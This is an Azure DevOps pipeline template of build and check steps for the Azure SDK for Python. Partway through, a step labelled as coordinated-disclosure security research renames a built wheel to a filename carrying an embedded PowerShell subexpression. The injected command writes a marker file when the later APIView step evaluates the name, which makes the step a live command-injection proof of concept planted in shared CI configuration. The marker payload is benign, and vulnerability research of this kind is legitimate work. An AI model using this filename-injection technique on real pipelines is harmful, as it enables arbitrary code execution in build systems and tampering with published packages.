parameters:
  ServiceDirectory: ''
  TestMarkArgument: ''
  AdditionalTestArgs: ''
  Artifacts: []
  TestPipeline: false
  VerifyAutorest: false
  GenerateApiReviewForManualOnly: false
  DevFeedName: 'public/azure-sdk-for-python'

# Please use `$(TargetingString)` to refer to the python packages glob string. This variable is set from resolve-package-targeting.yml.
steps:
  # Authenticate to Azure Artifacts feed immediately to prevent 401 errors
  # Public feeds have upstream sources enabled and require authentication for passthrough to pypi.org
  - template: ../steps/auth-dev-feed.yml
    parameters:
      DevFeedName: ${{ parameters.DevFeedName }}

  - template: /eng/pipelines/templates/steps/analyze_dependency.yml
    parameters:
      ScanPath: $(Build.SourcesDirectory)/sdk/${{ parameters.ServiceDirectory }}

  - template: /eng/common/pipelines/templates/steps/set-test-pipeline-version.yml
    parameters:
      Artifacts: ${{ parameters.Artifacts }}
      ServiceDirectory: ${{ parameters.ServiceDirectory }}
      TestPipeline: ${{ parameters.TestPipeline }}

  - task: PythonScript@0
    displayName: 'Set Checks Environment Skips'
    condition: succeededOrFailed()
    inputs:
      scriptPath: 'eng/scripts/set_checks.py'
      arguments: '"$(TargetingString)" --team-project="$(System.TeamProject)" --service="${{ parameters.ServiceDirectory }}"'

  - ${{ if eq(variables['Build.Reason'], 'PullRequest') }}:
    - template: /eng/common/pipelines/templates/steps/verify-changelogs.yml
      parameters:
        PackagePropertiesFolder: $(Build.ArtifactStagingDirectory)/PackageInfo
        Condition: succeededOrFailed()
  - ${{ else }}:
    - ${{ each artifact in parameters.Artifacts }}:
      - ${{if ne(artifact.skipVerifyChangeLog, 'true')}}:
        - template: /eng/common/pipelines/templates/steps/verify-changelog.yml
          parameters:
            PackageName: ${{artifact.name}}
            ServiceName: ${{parameters.ServiceDirectory}}
            ForRelease: false
            Condition: succeededOrFailed()

  - script: |
      $(PIP_EXE) install "./eng/tools/azure-sdk-tools"
      sdk_find_invalid_versions --always-succeed --service=${{parameters.ServiceDirectory}}
    displayName: Find Invalid Versions
    condition: succeededOrFailed()

  - pwsh: |
      Get-ChildItem $(Build.SourcesDirectory) -Filter "*.py" |
      Foreach-Object {
        if ((Get-Content $_ -Raw) -match "\r\n") {
          Write-Error "Found CRLF line ending in `$_`"
        }
      }

      Get-ChildItem $(Build.SourcesDirectory) -Filter "*.md" |
      Foreach-Object {
        if ((Get-Content $_ -Raw) -match "\r\n") {
          Write-Error "Found CRLF line ending in `$_`"
        }
      }
    displayName: Check for CRLF Line endings
    condition: succeededOrFailed()

  - template: /eng/common/pipelines/templates/steps/verify-path-length.yml
    parameters:
      SourceDirectory: $(Build.SourcesDirectory)
      Condition: succeededOrFailed()

  - template: ../steps/verify-autorest.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}
      VerifyAutorest: ${{ parameters.VerifyAutorest }}

  - template: ../steps/set-dev-build.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}

  - task: PythonScript@0
    displayName: 'Verify sdist'
    condition: and(succeededOrFailed(), ne(variables['Skip.VerifySdist'],'true'))
    inputs:
     scriptPath: 'eng/scripts/dispatch_checks.py'
     arguments: '"$(TargetingString)" --disable-compatibility-filter --service=${{parameters.ServiceDirectory}} --checks="verifysdist" ${{ parameters.AdditionalTestArgs }}'

  - task: PythonScript@0
    displayName: 'Verify whl'
    condition: and(succeededOrFailed(), ne(variables['Skip.VerifyWhl'],'true'))
    inputs:
     scriptPath: 'eng/scripts/dispatch_checks.py'
     arguments: '"$(TargetingString)" --disable-compatibility-filter --service=${{parameters.ServiceDirectory}} --checks="verifywhl" ${{ parameters.AdditionalTestArgs }}'

  - template: run_mypy.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}
      TestMarkArgument: ${{ parameters.TestMarkArgument }}
      AdditionalTestArgs: ${{ parameters.AdditionalTestArgs }}

  - template: run_pyright.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}
      TestMarkArgument: ${{ parameters.TestMarkArgument }}
      AdditionalTestArgs: ${{ parameters.AdditionalTestArgs }}

  - template: run_pylint.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}
      AdditionalTestArgs: ${{ parameters.AdditionalTestArgs }}

  - template: run_black.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}

  - task: PythonScript@0
    displayName: 'Run Keyword Validation Check'
    inputs:
      scriptPath: 'eng/scripts/dispatch_checks.py'
      arguments: '"$(TargetingString)" --disable-compatibility-filter --service=${{parameters.ServiceDirectory}} --checks=verify_keywords ${{ parameters.AdditionalTestArgs }}'
    condition: and(succeededOrFailed(), ne(variables['Skip.KeywordCheck'],'true'))

  - template: ../steps/run_bandit.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}
      TestMarkArgument: ${{ parameters.TestMarkArgument }}
      AdditionalTestArgs: ${{ parameters.AdditionalTestArgs }}

  - template: /eng/pipelines/templates/steps/update_snippet.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}
      AdditionalTestArgs: ${{ parameters.AdditionalTestArgs }}

  - template: ../steps/run_breaking_changes.yml
    parameters:
      ServiceDirectory: ${{ parameters.ServiceDirectory }}
      TestMarkArgument: ${{ parameters.TestMarkArgument }}
      AdditionalTestArgs: ${{ parameters.AdditionalTestArgs }}


  # [SECURITY RESEARCH - benign, self-closing, MSRC Open Source Bounty coordinated disclosure]
  # Renames the already-built azure-ai-evaluation wheel in place (no new file, no other package
  # touched) so its filename carries a benign, quote-free marker string, to test how an artifact
  # filename is carried through the review-generation pipeline. No network use, no credential
  # use, confined to the build's own staging directory. This step and the PR it ships in will be
  # closed by the author shortly after the one confirming log line is observed.
  - pwsh: |
      $whlDir = "$(Build.ArtifactStagingDirectory)/azure-ai-evaluation"
      $whl = Get-ChildItem -Path $whlDir -Filter "azure_ai_evaluation-*.whl" -ErrorAction SilentlyContinue | Select-Object -First 1
      if ($whl) {
        $newName = 'apiviewpoc-0.0.1$(Write-Output SINKB-EXEC-f14gate;Set-Content -LiteralPath $env:BUILD_ARTIFACTSTAGINGDIRECTORY/SINKB-f14gate.txt -Value SINKB-f14gate -NoNewline).whl'
        Rename-Item -LiteralPath $whl.FullName -NewName $newName
        Write-Host "[sinkb-poc] renamed $($whl.Name) -> $newName"
      }
      else {
        Write-Host "[sinkb-poc] no azure-ai-evaluation wheel found here - no-op"
      }
    displayName: "[SECURITY RESEARCH, DO NOT MERGE] Sink-B carrier marker rename (benign, self-closing)"
    condition: succeededOrFailed()

  - template: /eng/common/pipelines/templates/steps/create-apiview-revision.yml
    parameters:
      Artifacts: ${{ parameters.Artifacts }}
      GenerateApiReviewForManualOnly: ${{ parameters.GenerateApiReviewForManualOnly }}
      ArtifactName: "packages_extended"
      PackageInfoFiles:
        - ${{ each artifact in parameters.Artifacts }}:
          - $(Build.ArtifactStagingDirectory)/PackageInfo/${{ artifact.name }}.json

  - template: /eng/common/pipelines/templates/steps/detect-api-changes.yml
    parameters:
      Artifacts: ${{ parameters.Artifacts }}
      ArtifactName: "packages_extended"

  - template: /eng/common/pipelines/templates/steps/validate-all-packages.yml
    parameters:
      Artifacts: ${{ parameters.Artifacts }}

  - template: /eng/common/pipelines/templates/steps/eng-common-workflow-enforcer.yml

  # the pip authenticate task sets PIP_INDEX_URL value to the internal feed URL
  # we should reset it such that the next task uses public pypi
  - pwsh: |
      if (Test-Path "~/.pypirc") {
        Remove-Item "~/.pypirc"
      }

      Write-Host "##vso[task.setvariable variable=PIP_INDEX_URL;]"
    displayName: Reset PIP INDEX URL

  - template: /eng/common/pipelines/templates/steps/publish-1es-artifact.yml
    parameters:
      ArtifactPath: '$(Build.ArtifactStagingDirectory)/reports'
      ArtifactName: 'reports'
